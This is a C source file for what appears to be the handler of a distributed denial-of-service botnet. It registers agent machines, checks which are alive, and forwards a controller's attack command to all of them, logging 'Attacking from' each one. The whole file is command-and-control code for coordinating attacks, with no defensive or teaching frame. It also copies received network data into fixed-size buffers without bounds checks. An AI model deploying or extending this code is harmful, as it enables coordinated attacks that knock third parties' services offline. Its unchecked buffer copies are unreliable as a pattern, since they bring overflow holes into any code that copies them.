#include <stdio.h>      /* for printf() and fprintf() */
#include <stdlib.h>
#include <sys/socket.h> /* for recv() and send() */
#include <arpa/inet.h>  /* for sockaddr_in and inet_addr() */
#include <unistd.h>     /* for close() */
#include <string.h>


#define RCVBUFSIZE 32   /* Size of receive buffer */
#define APORT 1984      /* Agent port */
#define VER "1.1"         //version number

void DieWithError(char *errorMessage);  /* Error handling function */
void sendMessage(int sock, char buff[RCVBUFSIZE]);
int conn(char *p, int port, int sock);
int agentAlive(char *p, int port);
void parsing(char echoBuffer[RCVBUFSIZE], char parse[3][20]);

FILE*outFile;
FILE*inFile;
int recvMsgSize;
char code[RCVBUFSIZE];
char reply[RCVBUFSIZE];
struct sockaddr_in echoServAddr;  

int createAndConnect(char * p, int port){
    int sock;
    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        DieWithError("socket() failed");
    /* Construct the server address structure */
    memset(&echoServAddr, 0, sizeof(echoServAddr));     /* Zero out structure */
    echoServAddr.sin_family      = AF_INET;             /* Internet address family */
    echoServAddr.sin_addr.s_addr = inet_addr(p);   /* Server IP address */
    echoServAddr.sin_port        = htons(port); /* Server port */
    return(sock);
}

void HandleTCPClient(int clntSocket)
{
    char echoBuffer[RCVBUFSIZE]="";        /* Buffer for echo string */
                      /* Size of received message */
    char atkCmd[100];
    /* Receive message from client */
    if ((recvMsgSize = recv(clntSocket, echoBuffer, RCVBUFSIZE, 0)) < 0)
        DieWithError("recv() failed");
    strcpy(atkCmd,echoBuffer);
    /* store all token inside array */
    char parse[3][20];
    int port=APORT;
    //prase the buffer into 
    parsing(echoBuffer,parse);
    /* switch case to handle appropriate mode request from controller */
    int mode;
    mode = atoi(parse[0]);
    switch(mode) {
        case 1 :
            outFile=fopen("agent.txt","a");
            printf("the IP is %s \n", parse[1]);
            fprintf(outFile, "%s", parse[1]);
            fclose(outFile);

            strcpy(code,"[110] agent added\r\n");
            sendMessage(clntSocket, code);

            break;
        case 2 :
            printf("response to servers interoragtion \n");
            sprintf(code,"%s\0",VER);                                    
            if (send(clntSocket, code,strlen(code),0)!=strlen(code)) {
                DieWithError("reply sent failed");
            }
            break;    
        case 3 :
            inFile=fopen("agent.txt","r");
            outFile=fopen("ValidatedAgent.txt","w");
            int count = 0;
            if(inFile!=NULL) {
                char line[256];
                while(fgets(line, sizeof(line), inFile) != NULL) {
                    char* p = &line[0]; 
                    printf("Trying %s", p);
                    count += agentAlive(p, port);     
                }
            }
            fclose(inFile);
            fclose(outFile);

            sprintf(reply, "%d\r\n", count);
            sendMessage(clntSocket, reply);
            break;
        case 5 :
            inFile=fopen("ValidatedAgent.txt","r");
            int sock;
            if(inFile!=NULL) {
                char line[256];
                while(fgets(line, sizeof(line), inFile) != NULL) {
                    char* p = &line[0]; 
                    printf("Attacking from %s", p);
                    /* Create a and connect a new socket */
                    sock=createAndConnect(p, APORT);
                    /* Establish the connection to the echo server */
                    if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0)
                        printf("Failed to connect: %s", p);
                    else {
                        //printf("atk cmd %s sending to %s at socket %d \n",atkCmd,p,sock);
                        if (send(sock, atkCmd, strlen(atkCmd), 0) != strlen(atkCmd))   
                            DieWithError("attack command send failed from handler to Agent");
                    }
                    close(sock);
                    }
            }
            fclose(inFile);
            break;
        default :
            printf("Invalid Mode of Operation\n" );
            break;
    }


    close(clntSocket);    /* Close client socket */
    printf("going back to listening mode... \n");
}

void sendMessage(int clntSocket, char echoBuffer[RCVBUFSIZE]) {
    /* Send received string and receive again until end of transmission */
    while (recvMsgSize > 0)      /* zero indicates end of transmission */
    {   
        /* Echo message back to client */
        if (send(clntSocket, echoBuffer, strlen(echoBuffer), 0) != strlen(echoBuffer))
            DieWithError("send() failed");

        /* See if there is more data to receive */
        if ((recvMsgSize = recv(clntSocket, echoBuffer, RCVBUFSIZE, 0)) < 0)
            DieWithError("recv() failed");
    }    
}

int conn(char *p, int port, int sock) {
    
    /* Construct the server address structure */
    memset(&echoServAddr, 0, sizeof(echoServAddr));     /* Zero out structure */
    echoServAddr.sin_family      = AF_INET;             /* Internet address family */
    echoServAddr.sin_addr.s_addr = inet_addr(p);   /* Server IP address */
    echoServAddr.sin_port        = htons(port); /* Server port */
    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        DieWithError("socket() failed");
    
    return(connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)));
}

int agentAlive(char *p, int port) {
    int sock;
    int alive=0;
    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        DieWithError("socket() failed");
                    
    /* Establish the connection to the echo server */
    if (conn(p, port,sock) < 0)
        printf("Failed to connect: %s", p);
    else {
        alive=1;
        printf("Agent in operation: %s", p);
        fprintf(outFile, "%s", p);
    }
    close(sock);
    return alive;
}

void parsing(char echoBuffer[RCVBUFSIZE], char parse[3][20])
{
    int i = 0;
    char *token = strtok(echoBuffer, ":");
    /* Tokenize commands */     
    while(token != NULL) {
        strcpy(parse[i], token);
        token = strtok(NULL, ":");
        i++;
    } 
}